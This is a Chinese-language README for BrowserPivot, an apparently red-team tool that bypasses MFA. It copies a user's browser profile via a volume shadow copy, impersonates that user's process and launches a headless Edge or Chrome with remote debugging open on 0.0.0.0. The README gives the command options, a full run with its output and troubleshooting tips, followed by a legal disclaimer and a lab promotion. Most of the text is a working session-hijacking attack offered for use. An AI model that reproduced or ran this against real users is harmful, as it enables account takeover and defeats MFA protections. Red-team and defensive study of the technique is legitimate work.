# BrowserPivot

BrowserPivot是一个基于卷影复制和浏览器调试模式功能以达到绕过MFA验证的自动化辅助工具。

# 使用场景

- 无法使用明文账号密码登录网站
- 无法使用Cookies登录网站

# 使用方法

```
-p 需要模拟的进程PID，通常为要访问的资源用户PID
-l 启动非占用本地端口
-b 请选择chrome或者msedge，其他选择请自行修改代码
```



```
C:\Users\rootrain\source\repos\BrowserPivot\BrowserPivot\bin\Debug>BrowserPivot.exe -p 10732 -l 2555 -b msedge

 ____                                  _____ _            _
|  _ \                                |  __ (_)          | |
| |_) |_ __ _____      _____  ___ _ __| |__) |__   _____ | |_
|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  ___/ \ \ / / _ \| __|
| |_) | | | (_) \ V  V /\__ \  __/ |  | |   | |\ V / (_) | |_
|____/|_|  \___/ \_/\_/ |___/\___|_|  |_|   |_| \_/ \___/ \__|

[+] Volume: \\?\Volume{e8e4545b-7571-4c89-ba6f-e6cf232eb558}\
[+] Shadow copy ID: {9688E39D-BD6F-4115-B596-90C6BCC71D26}
[+] Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
[+] Copy directory \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\rootrain\AppData\Local\Microsoft\Edge\User Data to directory C:\Users\rootrain\AppData\Local\UwFwjfWgw9
[+] msedge path: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
[+] Process handle: True
[+] Impersonated user: DESKTOP-TAVA6P8\rootrain
[+] Start process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --user-data-dir=C:\Users\rootrain\AppData\Local\UwFwjfWgw9 --remote-debugging-port=2555 --remote-debugging-address=0.0.0.0 --headless about:blank
[+] Shadows deleted successfully
```



# 注意事项

```
1.如发现C盘磁盘占用过高，请清除卷影复制的目录，位于C:\Users\%USERNAME%\AppData\Local\
2.如果进程无法进行模拟，可以多试几个PID，或者手动启动进行并模拟
```

# 免责声明
本工具仅面向合法授权的企业安全建设行为或教学使用，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描和攻击。

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任。

在安装并使用本工具前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。

# 安恒-星火实验室
<h1 align="center">
  <img src="starfile.jpeg" alt="starfile" width="200px">
  <br>
</h1>

专注于实战攻防与研究，研究涉及实战攻防、威胁情报、攻击模拟与威胁分析等，团队成员均来自行业具备多年实战攻防经验的红队、蓝队和紫队专家。本着以攻促防的核心理念，通过落地 ATT&CK 攻防全景知识库，全面构建实战化、常态化、体系化的企业安全建设与运营。
